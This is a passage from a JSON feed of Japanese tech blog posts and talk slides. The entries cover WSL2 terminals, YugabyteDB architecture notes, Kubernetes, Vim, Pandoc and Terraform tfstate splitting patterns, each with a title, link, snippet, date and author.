Shun","authorId":"moz-sec"},{"title":"WezTerm で快適な WSL2 環境にする","link":"https://blog.1q77.com/2023/08/wezterm-on-windows/","contentSnippet":"家の自分用 Laptop はずっと Linux を使ってきましたが、数か月前に Inspiron 14 に買い替えたタイミングで Ubuntu 22.04 にしてからやっぱり不便だなあとも思っていました。(InputMethod の切り替えで直接入力とひらがなだけにしたいのに Hankaku ってのが外せないとか、電源管理回りとか、snap でインストールしたアプリは日本語入力できないとか)","isoDate":"2023-08-12T11:07:01.000Z","dateMiliSeconds":1691838421000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Keyball61のオレオレマッピングを語る","link":"https://blog.atusy.net/2023/08/12/keyball61/","contentSnippet":"たぶんKeyball61ユーザーの中でも珍しい配列をしているだろうと思うので、その背景も含めてまとめておく。右手トラックボールです。親指によるHold & Tap親指はCtrl, Shift, Alt, WinやLayer操作などの修飾キーの操作を担います。","isoDate":"2023-08-12T00:00:00.000Z","dateMiliSeconds":1691798400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"SREからPlatform Engineerへの拡大","link":"https://speakerdeck.com/nwiizo/srekaraplatform-engineerhenokuo-da","contentSnippet":"SREからPlatform Engineerへの拡大 というタイトルで登壇してきました\\r\\rCloud Operator Days Tokyo 2023 運用の新時代　〜Effortless Operation〜\\rhttps://cloudopsdays.com/\\r\\rクラウドインフラ運用技術者のための年次イベント「Cloud Operator Days Tokyo 2023」の見所を紹介\\rhttps://cloud.watch.impress.co.jp/docs/news/1518302.html\\r\\rSREからPlatform Engineerへの拡大 というタイトルで登壇しました - じゃあ、おうちで学べる  https://syu-m-5151.hatenablog.com/entry/2023/08/10/150412 \\r\\r登壇しかないので20分しかないのでｷﾞｭｯとしてしまいました。","isoDate":"2023-08-09T04:00:00.000Z","dateMiliSeconds":1691553600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"YugabyteDBのドキュメントを全部読む Day4","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/4_key_concepts_yb_master_service","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > YB-TServer serviceを読みました。今回はArchitecture > Key Concepts > YB-Master serviceを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。YB-Master serviceYB-Masterサービスはテーブルやそのタブレットの場所、ユーザー・ロールの権限といったシステムのメタデータとレコードの管理を行っている。それに加えYB-Masterはロードバランシングやレプリケーションの開始といったバックグラウンドオペレーションの管理や、テーブルのCREATEやALTER、DROPといった様々な管理オペレーションの責任を持つ。YB-MasterはRaft Groupを組むことで高可用性を実現し、またテーブルに対するI/Oの単一障害点にならない。Functions of YB-MasterYB-Masterはシステムの重要な機能を複数持っている。Coordination of universe-wide administrative operationsCREATE TABLEやALTER TABLE、DROP TABLEといったユーザーからのリクエスト処理やバックアップの実行などUniverseをまたぐオペレーション実行の調整を担当している。YB-Masterではこれらのオペレーションがテーブルを保持するYB-TServerの状態に関わらず、全てのテーブルに伝搬されることを保証する。YugabyteDBは分散システムのため、Universeをまたぐ処理中にYB-TServerに障害が発生し一部のタブレットへの適用に失敗してもオペレーションの結果に問題が発生しないことが重要だからである。Storage of system metadataそれぞれのYB-Masterではネームスペースやテーブル、ロール、パーミッション、YB-TServerへ割り当てたテーブル情報を含むシステムメタデータを保存している。これらのシステムレコードはYB-Masterを対象にRaftグループを組みレプリケーションすることで冗長性を実現している。またシステムレコードはYB-Masterが管理するDocDBに保存される。Authoritative source of tablet assignments to YB-TServersYB-Masterは全てのテーブルとそれらをホストするYB-TServerの情報を保存している。一般のクライアントではそれらの情報はクライアントからクエリレイヤなどを通して取得された上で、クライアントにメタデータを返しデータアクセスが行なわれる。一方でスマートクライアントではYB-Masterに保存されたメタデータを利用して特定のYB-TServerが保持するタブレットやキャッシュを利用することが出来るため、データアクセス時のネットワークをまたぐ通信を減らすことができパフォーマンスを高めることができる。Background operationsいくつかのオペレーションはUniverseのライフタイムを通してバックグラウンドで行なうことで、フォアグラウンドのRead/Writeに影響を与えずに実行することが出来る。Data placement and load balancingYB-MasterのリーダーはCREATE TABLE時にタブレットの初期配置をYB-TServerをまたいで行なう。そのときにユーザー定義のデータ配置制約を強制し均一な読み込みを保証する。Universeのライフタイム中のノード追加や障害が発生しても、負荷分散を継続しデータ配置の制約を自動的に適用する。Leader balancing複数のYB-TServerに配置されたタブレットへのアクセスがUniverseをまたいで分散されることを保証している一方で、YB-Masterは対象となるノード1間でそれぞれのノードが同じ数のtablet-peer leader2をもつことを保証する。Rereplication of data on extended YB-TServer failureYB-Masterは全てのYB-TServerからハードビートシグナルを受け取ることでYB-TServerの死活監視を行なっている。そしてYB-MasterはYB-TServerの異常を検知したときに、どれぐらいのあいだYB-TServerが異常であったかを追跡する。閾値を超えると、YB-Masterは障害中のYB-TServerに配置されていたタブレットを再配置するYB-TServerを探し、レプリケーションを実行する。レプリケーションはYB-Masterリーダーに抑制された状態で実行されるため、Universeのフォアグラウンドオペレーションには影響をおよぼさない。Raft Groupのリーダーになれるノード↩↩","isoDate":"2023-08-03T14:48:34.000Z","dateMiliSeconds":1691074114000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"k8sgpt Deep Dive: KubernetesクラスタのAI駆動型分析について","link":"https://speakerdeck.com/nwiizo/k8sgpt-deep-dive-kuberneteskurasutanoaiqu-dong-xing-fen-xi-nituite","contentSnippet":"k8sgpt Deep Dive: KubernetesクラスタのAI駆動型分析についてというタイトルで登壇しました\\r\\r2023年8月3日 CloudNative Days Fukuoka 2023\\rhttps://event.cloudnativedays.jp/cndf2023\\r\\rk8sgpt Deep Dive: KubernetesクラスタのAI駆動型分析について\\rhttps://event.cloudnativedays.jp/cndf2023/talks/1885\\r\\rK8sGPT Deep Dive というタイトルで登壇しました #CNDF - じゃあ、おうちで学べる  \\rhttps://syu-m-5151.hatenablog.com/entry/2023/08/03/155326","isoDate":"2023-08-03T04:00:00.000Z","dateMiliSeconds":1691035200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"YugabyteDBのドキュメントを全部読む Day3","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/3_key_concepts_yb_tserver_service","contentSnippet":"YugabyteDBのドキュメントを全部読む Day3前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > Universeを読みました。今回はArchitecture > Key Concepts > YB-TServer serviceを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。それはそれとして技術系の単語をカタカナ表記で誤魔化していて、体系的に学んでいないことがバレてしまう。特にストレージまわりが分からない……YB-TServer serviceYB-TServer(YugabyteDB Tablet Servcer)はユーザからの受けつけたYugabyteDBクラスタへのリクエストのI/Oの処理をする。テーブルのデータは一つ以上のTablet peerに分割(シャーディング)される。peerの数はレプリケーションファクターによって決定される。YB-TServerは一つ以上のTablet peerをホストする。Tablet peerはRaftグループを形成してグループ間でデータの複製を行ない、タブレットはYB-TServer上で最大の効率になるように管理される。Server-global block cacheブロックキャッシュは一つTB-TServer上の異なるタブレット間で共有される。YB-TServerのメモリ効率は一つのテーブルからの読み込みが多いほど最適化される。Space AmplificationYugabyteDBではSize-tired Compactionというライトアンプリフィケーション1が小さい圧縮方式を利用している。Size-tired Compactionはスペースアンプリフィケーション2が大きいという問題があるが、YugabyteDBではテーブルは複数のタブレットに分割され、タブレット間でのConcurrent Compactionは特定の最大値まで絞られるため問題になりにくい。YugabyteDBでは凡そ10-20%のスペースアンプリフィケーションにおさまる。つまりSize-tired Compaction一単位が扱うデータ量を小さく(タブレット化)して、同時に実行される圧縮処理数を絞ることで特定のタイミングで圧縮に使用されるストレージ容量を抑えているということ？Throttled compactionsYB-TServerではタブレット間で実行される圧縮処理の同時実行数を制限することで、圧縮処理が多量のリソースを占有することを防いでいる。この機能は圧縮されるファイル同士のサイズを比べ、実行される圧縮処理が妥当であることを確認することで実現されている。Small and large compaction queuesYB-TServerでは圧縮処理を大きい圧縮処理と小さい圧縮処理に分けて優先度を決めることで、I/Oが大きな場合でもシステムの機能を保っている。YugabyteDBでは圧縮処理数を制限することに加え、様々な最適化を実行することで圧縮処理の影響を最小化している。Manual compactionYugabyteDBではyb-admin utilityのcompact_tableコマンドにより、任意のタイミングでテーブルに対して圧縮を実行することが出来る。この方法はデータが新しく書き込まれない場合や、DDLやTTLの超過によるデータ削除時によりデータが断片化したときに有効である。Statistics-based full compactions to improve read performanceYugabyteDBでは読み込まれたkey-valueペアをDocDBレベルで監視している。監視対象となる時間軸はauto-compact-stat-window-secondsで管理されている。YugabyteDBがデータ読み込み時に多量の廃棄されたデータのスキップを検知した場合、full compactionがトリガーされ不要なキーの削除が行なわれる。Full compactionがトリガーされる詳細な条件は対象の時間軸で以下が満された時である。廃棄されたキーとアクティブなキーが読まれる割り合いがauto-compact-percent-obsoleteで定義された閾値を超たとき。廃棄されたキーの読み込みauto-compact-min-obsolete-keys-foundで定義された閾値を超たとき。この機能はTTLを設定したテーブルと互換性があり、TTL file expirationが有効なテーブルではスケジュールされた圧縮を実行しない。Scheduled full compactionsYugabyteDBでは全てのデータに対するデータ圧縮をスケジュール実行することが出来る。スケジュール実行はscheduled-full-compaction-frequency-hoursとscheduled-full-compaction-jitter-factor-percentageのフラグで管理される。この機能は大量のDELETEとUPDATEを定常的に実行するワークロードでのパフォーマンスとディスクスペースの再割り当てに有効である。スケジュール化したデータ圧縮はTTLと互換しているが、TTL file expirationとは互換していない。つまりスケジュールされた圧縮は実行されない。Server-global memstore limitServer-global memstore limitは一つのYB-TServer上のタブレット間でシェアされるメモリサイズを追跡し、強制する。この機能はタブレット間の書き込みに偏りがある場合に有効である。一つのテーブルに書き込みが集中しているばあい、メモリ制限以上のメモリを割り当てることでパフォーマンスを向上させることが出来る。Auto-sizing of block cache and memstoreBlock Cacheとmemstoreは何れも多量のメモリを使用している。これらはtablet-peer間で共有されるリソースのため、メモリ管理とこれらのコンポーネントの様々な環境に合せたサイジングを容易にしている。YB-TServerでは自動で特定の割合のメモリをBlock CacheとMemstoreに割り当てる。Distributing tablet load uniformly across data disks複数のSSDを利用するハードウェアでは、テーブルのデータ(SSTable)とWALはテーブル毎に利用可能なディスクに均等に分散される。このストライピングと呼ばれる負荷分散は、それぞれのディスクがそれぞれのテーブルの負荷を均等に処理することを保証する。SSDで実際に書き込んだデータより書き込み量が増幅する現象。もちろんライトアンプリフィケーションが小さいほうが望ましい。↩↩","isoDate":"2023-08-02T16:13:24.000Z","dateMiliSeconds":1690992804000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Hello, Quarto","link":"https://blog.atusy.net/2023/08/01/hello-quarto/","contentSnippet":"本ブログはずっとblogdownを使って書いてきましたが、心機一転quartoで書いてみることにします。といってもblogdownユーザーであれば移行に特に苦労はなさそうです。blogdownはHugoを使ってページを構築するので、quartoとhugoの組み合わせ方を調べ、合わせればOK。","isoDate":"2023-08-01T00:00:00.000Z","dateMiliSeconds":1690848000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"日本語の「っ」から始まる送り仮名とSKK+AZIKによる日本語入力に関する考察","link":"https://blog.atusy.net/2023/08/01/skk-azik-and-sokuon-okuri/","contentSnippet":"始めにSKKという日本語入力システムがある。元々はEmacsというエディタ向けに開発されたものだが、現在では各種OSのIMEや他のエディタの日本語入力システムとしても活用されている。","isoDate":"2023-08-01T00:00:00.000Z","dateMiliSeconds":1690848000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"NFT技術概論","link":"https://speakerdeck.com/shukob/nftji-shu-gai-lun","contentSnippet":"https://event.ospn.jp/osc2023-online-kyoto/session/1049448\\rOSC Onlineにて、ブロックチェーン上で表現されるNFT(Non Fungible Token:代替不能トークン)の技術概要についてお話ししました。\\r\\rブロックチェーン、イーサリアム・スマートコントラクトに触れた後、イーサリアム上でNFTを表現するためのERC721規格や、NFTでは画像データを保存するのに使われる分散ストレージのIPFS(InterPlanetary File System)について解説しています。","isoDate":"2023-07-29T04:00:00.000Z","dateMiliSeconds":1690603200000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"YugabyteDBのドキュメントを全部読む Day2","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/2_key_concepts_universe","contentSnippet":"YugabyteDBのドキュメントを全部読む Day2前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Design goalsを読みました。今回はArchitecture > Key Concepts > Universeを読みます。また画像は同ドキュメントより引用しています。UniverseYugabyteDBは耐久性とスケーラビリティを兼ねそなえた分散データベースを達成するために、Universe1と呼ばれるノードのグループを持っている。Universeはビジネス要件やレイテンシの兼ね合いでシングルゾーン、単一リージョンマルチゾーン、マルチリージョン、同期・非同期レプリケーションなどを選択することが出来る。UnivereはClusterと表現されることもある。データの構成Universeは一つ以上のネームスペースを持つことができ、またネームスペースは一つ以上のテーブルを持つことができる。YugabyteDBではUniverse上に存在するノードにまたがって保持されるテーブルを設定に従って、シャーディングし、レプリケーション、ロードバランシングを行なう。YugabyteDBはノードやディスク、ゾーンなどに発生した障害に自動で対応し、必要であればデータを新規に分散、レプリケーションを行なう。ネームスペースはYSQLではデータベースに対応し、ほかのDBにおけるネームスペースに対応する2。YCQLではキースペースに対応し、Cassandraのキースペースに対応している。サービスコンポーネントUniverseはYugabyteDB Tablet Server(YB-TServer)とYugabyteDB Master Server(YB-Master)の二つで構成されている。YB-MasterとYB-TServerはRaftにより分散されており、高可用性を達成している。YB-Tserverはテーブルを始めとしたユーザーデータの保存、提供を担当する。YB-Masterはシステムのメタデータを管理し、システム全体のテーブルに対するDDLやメンテナンスの実行、ロードバランシングといったオペレーションを管理する。UniverseとClusterUniverseは一つのプライマリクラスタとゼロ個以上のレプリカクラスタによって構成されている。プライマリクラスタプライマリクラスタはRead/Write両方の実行と、プライマリクラスタ内のノード間の同期的なレプリケーションを担当する。リードレプリカクラスタリードレプリカクラスタはRead処理のみを実行する。Write処理は自動的にプライマリクラスタにルーティングされる。リードレプリカクラスタを利用することで、地理的に分散したデータに対する読み取りの遅延を小さくすることができる。データはプライマリクラスタから非同期的にとりこまれる。これはRaftの書き込みには関与しないRaftオブザーバとして機能する。GoogleのCloud Spannerでも同様にUniverseと呼ばれている↩PostgreSQLではSchemaの裏側に存在するデータ構造↩","isoDate":"2023-07-26T15:03:13.000Z","dateMiliSeconds":1690383793000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day1","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/1_design_goals","contentSnippet":"Day1最近Twitter改めXで「俺はDBのドキュメント端から端まで読んで強くなった」というX\'s1を複数みかけました。周りのエンジニアに一歩差をつける方法として、フレームワークやミドルウェアやライブラリのドキュメントを最初から最後までちゃんと読む、というのがあって、これはマジでコスパ抜群です。— 徳永広夢 (@tokuhirom) July 21, 2023 確かに私のRedisはこれ。 https://t.co/2y1E01aLGw— maru (@maruloop) July 22, 2023 私のMySQLもこれ。 https://t.co/BxiOjeQVPk— yoku0825 (@yoku0825) July 22, 2023 俺のpostgresqlもこれ。 https://t.co/URRjyXCpGI— そーだい@初代ALF (@soudai1025) July 22, 2023 PostgreSQL系NewSQLで最強になりたいのでYugabyteDBのドキュメントを順番に読んで行きます。ドキュメントはv2.19に対応したものです。手始めにArchitectureの一番先頭にあるDesign goalsから読みはじめます。また画像は同ドキュメントより引用しています。Design goalsYugabyteDBは以下を達成することを目標としている。1. 分散トランザクションを提供しながら強い一貫性を保証する。2. Query APIを再発明せず、既存のクエリ言語への互換を達成する。3. 高いパフォーマンスを保証する。4. 地理的に分散したデプロイを可能にする。5. Cloud Native Databaseとしてデザインする。一貫性分断耐性YugabyteDBはCAPの定理で言えばCPを中心に高い可用性を供えたデータベースネットワーク分断などを起因とするSplit BrainはRaft Group内であたらしいリーダーを選出することで対応している。YugabyteDBではLeader Leaseという障害が発生しても常に一つのリーダが存在することを保証する仕組みを実装している。直列化可能性single-row Linearizable writeをサポートしている。ACIDトランザクションYugabyteDBではSeriarizable、Repetable Read、Read Committed Isolationの三つの分離レベルをサポートしている。YSQL APIではこれら3つの分離レベルをサポートしているが、YCQLではRepeatable Readのみに対応している。Query APIYugabyteDBではYSQLとYCQLという2種類のQuery APIをサポートしている。YSQLYSQLはPostgreSQLに互換したAPIでPostgreSQLのクエリレイヤを再利用している。新しい変更は互換性を崩さない。YSQLは新しいPostgreSQLに互換しつづけることを目標としている。YCQLYCQLはCassandraのクエイ言語から派生した半リレーショナルなクエリ言語で、Webスケールな膨大なwriteに対応してスケールし素早いデータ取得を目標としている。パフォーマンスC++で実装されているため高いパフォーマンスと巨大なHeap(RAM)をCacheとして利用できる。SSDとNVMeに最適化している。高いWriteスループットとクライアントの同時実行性、高いデータ密度、増加し続けるデータへの対応を目標としている。地理的分散Zone、Multi Region、Multi Cloudいずれにも対応している。これに対応するために、ノード障害やトラヒックのルーティングなどに対応できる必要がある。クラウドネイティブアーキテクチャパブリッククラウドやオンプレミスで利用される一般てきなハードウェアで利用可能にする。原子時計のような特別なものに依存しない。Kubernatesに対応している。OSSで提供している。https://twitter.com/SawyerMerritt/status/1683365478582951936↩","isoDate":"2023-07-25T15:01:52.000Z","dateMiliSeconds":1690297312000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Vimでコマンドライン履歴を遡りやすくする","link":"https://blog.atusy.net/2023/07/24/vim-clean-history/","contentSnippet":"本記事はVim 駅伝7/24の記事です。Vimのコマンドラインで、履歴を遡りたい時、:wとか:qaとかが出てきて煩わしく感じることがあります。正直、これくらいシンプルなExコマンドであれば履歴に残しておく意味すら薄いので、履歴に残さない（or 履歴から消す）といいでしょう。","isoDate":"2023-07-24T00:00:00.000Z","dateMiliSeconds":1690156800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Terraformでmapにkeyが含まれないときにスキップしたい","link":"https://zenn.dev/nnaka2992/articles/skip_when_key_does_not_exists_in_map_terraform","contentSnippet":"Google CloudではPublic IPを利用した際に割り振られる可能性のあるCIDRの一覧がcloud.jsonでJSON形式で公開されています。この記事は雑な検証用のTerraformで承認済みネットワークにasia-notheast1のCIDRを全部登録してやろうとしたとき、上記のJSONファイルからscopeがasia-northeast1のprefixes.ipv4Prefixを抜きだそうとしたときにハマったのでその対応方法のメモです 結論以下のような感じで書いたら対応できました。contains(keys(hoge), \\"fuga\\") # hogeのkeyにh...","isoDate":"2023-07-22T14:53:12.000Z","dateMiliSeconds":1690037592000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes の upstream のキャッチアップ","link":"https://zenn.dev/toversus/articles/52b107ab103712","contentSnippet":"先日、Kubernetes Meetup Tokyo #59 で「KEP から眺める Kubernetes」というタイトルで発表しました。発表の後で Kubernetes の upstream のキャッチアップ方法について質問を受けました。その場で回答はしたのですが、ちょうど社内の共有会で似たような話をしたところだったので、加筆修正したものを公開しておきます。 はじめにKubernetes の upstream を追いかけ始めて 1 年ちょっと経ったので、その経験をまとめます。Kubernetes の upstream やエコシステムを観察しているだけで、コントリビュータではありま...","isoDate":"2023-07-20T10:18:32.000Z","dateMiliSeconds":1689848312000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Pandoc 3でカスタムライターがとてもよくなった","link":"https://blog.atusy.net/2023/07/14/pandoc-3-custom-writer/","contentSnippet":"様々な文書形式を相互変換するPandocにはカスタムライター・カスタムリーダーという、独自形式の読み書きをサポートする機能があります。Lua言語で記述でき、便利関数も色々と用意されています。","isoDate":"2023-07-14T00:00:00.000Z","dateMiliSeconds":1689292800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Cloud Native の作法","link":"https://speakerdeck.com/nwiizo/cloud-native-nozuo-fa","contentSnippet":"2023年7月13日 \\r\\r成熟度モデルを活用したCloud Nativeへの道筋 という副題で登壇します #開発生産性con_findy\\rhttps://syu-m-5151.hatenablog.com/entry/2023/07/13/131433\\r\\r\\r開発生産性Conference の登壇資料\\rhttps://findy.connpass.com/event/283417/","isoDate":"2023-07-13T04:00:00.000Z","dateMiliSeconds":1689220800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"メールが届いたら Google Home で音声で通知する","link":"https://blog.1q77.com/2023/07/ses-lambda-and-cloud-pubsub/","contentSnippet":"以前、「LINE に送ったメッセージを Google Home に読み上げさせる」という記事を書きました。その時に作ったものに家にあるラズパイで Cloud PubSub を subscribe してメッセージが届いたらその内容を Text-to-Speach で音声化して Google Home で再生する仕組みが存在します。","isoDate":"2023-07-10T14:25:35.000Z","dateMiliSeconds":1688999135000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"コンテナセキュリティ","link":"https://speakerdeck.com/kyohmizu/kontenasekiyuritei","contentSnippet":"「コンテナセキュリティ - Forkwell Library#26」の資料です。\\rhttps://forkwell.connpass.com/event/287259/","isoDate":"2023-07-05T04:00:00.000Z","dateMiliSeconds":1688529600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【Terraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80】tfstateファイルの分割パターンとディレクトリ構成への適用","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/07/05/001756","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Terraformのtfstateファイルを分割する目的と、オススメの分割パターンについて (★で表現)Terraformのリポジトリやリモートバックエンドのディレクトリ構成の設計について記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. なぜ tfstate ファイルを分割するのか分割しなかった場合分割した方がいい場合分割しない方がいい場合03. tfstate ファイルの分割分割の境界状態の依存関係図依存関係図とは依存関係の表現▼ 依存関係の表現記法▼ 依存関係がない場合▼ 依存関係がある場合04. tfstate ファイルに基づくその他の設計リポジトリ \uD83D\uDC31 の設計リポジトリ分割ディレクトリ \uD83D\uDCC2 構成リモートバックエンド \uD83E\uDEA3 の設計リモートバックエンド分割ディレクトリ構成05. 状態の依存関係の定義方法terraform_remote_stateブロックの場合terraform_remote_stateブロックによる依存状態の依存関係図リポジトリのディレクトリ構成リモートバックエンドのディレクトリ構成AWSリソース別dataブロックの場合AWSリソース別dataブロックによる依存状態の依存関係図リポジトリのディレクトリ構成リモートバックエンドのディレクトリ構成06. tfstate ファイルの分割パターンオススメな設計の一覧大分類 (上層/下層/中間層) とディレクトリ構成の関係リポジトリの場合リモートバックエンドの場合07. 上層の分割 (推奨)上層の分割についてプロバイダーのアカウント別 - ★★★この分割方法について【プロバイダーアカウント別】状態の依存関係図【プロバイダーアカウント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【プロバイダーアカウント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合08. 下層の分割 (推奨)下層の分割について実行環境別 - ★★★この分割方法について【実行環境別】状態の依存関係図【実行環境別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【実行環境別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンド x AWSアカウント別に異なる実行環境 の場合▼ 同じリモートバックエンド x 単一のAWSアカウント内に全ての実行環境 の場合09. 中間層の分割 (任意)中間層の分割について運用チーム責務範囲別 - ★★この分割方法について【チーム別】状態の依存関係図【チーム別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【チーム別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合プロダクトのサブコンポーネント別 - ★★この分割方法について【サブコンポーネント別】状態の依存関係図【サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別 - ★この分割方法について【チーム別 \xd7 サブコンポーネント別】状態の依存関係図【チーム別 \xd7 サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【チーム別 \xd7 サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合同じテナント内のプロダクト別この分割方法について【同じテナント内のプロダクト】状態の依存関係図【同じテナント内のプロダクト】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【同じテナント内のプロダクト】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合AWSリソースの種類グループ別この分割方法について【種類グループ別】状態の依存関係図【種類グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【種類グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合AWSリソースの状態の変更頻度グループ別この分割方法について【変更頻度グループ別】状態の依存関係図【変更頻度グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【変更頻度グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合10. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、Mitchell Hashimoto です。さて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、チームが使っているTerraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80のリポジトリをリプレイスする作業を担当しました。このリポジトリでは単一のtfstateファイルが状態を持ち過ぎている課題を抱えていたため、課題に合った適切な分割パターンでリプレイスしました。今回は、この時に整理した分割パターン (AWS向け) を記事で解説しました。もちろん、GoogleCloudやAzureでも読み換えていただければ、同じように適用できます。知る限りの分割パターンを記載したところ、情報量がエグいことになってしまったため、気になる分割パターンだけ拾って帰っていただけるとハッピーです\uD83D\uDE4Fそれでは、もりもり布教していきます\uD83D\uDE1702. なぜ tfstate ファイルを分割するのか%%{init: { \'theme\': \\"default\\", \'themeVariables\': { \'commitLabelFontSize\': \'13px\' }}}%%gitGraph   commit id: \\"8c8e6\\"   commit id: \\"0e3c3\\"     branch feature/foo     checkout feature/foo     commit id: \\"4e9e8\\"     commit id: \\"da005\\"   checkout main     branch feature/bar     commit id: \\"2d52f\\"   checkout main   commit id: \\"e74d6\\"     branch feature/baz     commit id: \\"f6881\\"分割しなかった場合そもそも、なぜtfstateファイルを分割する必要があるのでしょうか。tfstateファイルを分割しなかったと仮定します。様々なインフラコンポーネントを単一のtfstateファイルで状態を持つ場合、1回のterraformコマンド全てのコンポーネントの状態を操作できて楽です。ただし、複数の作業ブランチがある状況だと煩わしいことが起こります。各作業ブランチでインフラコンポーネントの状態を変更しかけていると、他の作業ブランチから影響を受け、terraformコマンドでtargetオプションが必要になってしまいます。他にも、terraformコマンドの完了に時間がかかりすぎるといった問題も起こるかもしれません。単一のtfstateファイルで管理するコンポーネントが多くなるほど、これらの問題は顕著になります。分割した方がいい場合その一方で、tfstateファイルをいい感じに分割したと仮定します。各作業ブランチでは、まるで暗黙的にtargetオプションがついたように、他の作業ブランチから影響を受けずにterraformコマンドを実行できます。よって、各tfstateファイルを操作できる管理者は互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Terraform: Up and Running: Writing Infrastructure as CodeOrganizing With Multiple States - DevOps with Terraform - CloudCasts分割しない方がいい場合運用ルールや開発者人数が理由で作業が衝突せず、targetオプションが必要ない状況であれば、tfstateファイルは分割しなくてもよいでしょう。tfstateファイルを分割するメリットが少ないです\uD83D\uDE45\uD83C\uDFFB‍03. tfstate ファイルの分割分割の境界それでは、tfstateファイルの分割の境界はどのようにして見つければよいのでしょうか。これを見つけるコツは、できるだけ相互に依存しないインフラリソースの関係 に注目することだと考えています。ここでいう依存とは、\\"tfstateファイルが他のtfstateファイルの状態を使用すること\\" です。もう少し具体的に言語化すると、\\"特定のインフラリソースが他の設定値を参照すること\\" です。状態をほとんど使用し合わない (互いに設定値の参照数が少ない) インフラリソース同士を、異なるtfstateファイルで管理します。異なるtfstateファイルで管理できる分割パターンについては後述します。▶ 『依存』という用語についてtfstateファイルでも同じ用語で表現することにしました。@tmknom さんが述べている通り、Terraformをよりよく設計するためには、『ソフトウェアの基礎知識』が必要です\uD83D\uDC4D状態の依存関係図依存関係図とは分割したtfstateファイル間の状態の依存関係を表現した図です。プロバイダーのアカウントの状態をtfstateファイルで管理していることを想像してみてください。%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWSアカウント        foo[\\"tfstateファイル\\"]    end似たものとしてterraform graphコマンドによるグラフがありますが、これはインフラリソース間の依存関係図です。tfstateファイル間で相互に依存関係があるからといって、個別のインフラリソース間で循環参照が起こってしまうというわけではないです。続いて、依存関係がある場合と無い場合で、どのような依存関係図になるかを紹介していきます。Command: graph | Terraform | HashiCorp Developer依存関係の表現▼ 依存関係の表現記法tfstateファイル間で状態の依存関係がある場合、これを図で表現すると分割の状況がわかりやすくなります。『依存』は、---> (波線矢印) で表現することとします。依存関係がある場合については、後述します。▶ 『依存』の波線矢印について---> (波線矢印) で表現します。そのため便宜上、tfstateファイルでも同じ記号で表現することにしました\uD83D\uDC4D▼ 依存関係がない場合例えば、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、 tfstate ファイル間に依存関係はないとします。そのため、想定される状態の依存関係図は以下の通りになります。tfstateファイル間に依存関係がない状況がベストです。---title: tfstateファイル間に依存関係はない---%%{init:{\'theme\':\'default\'}}%%flowchart TB    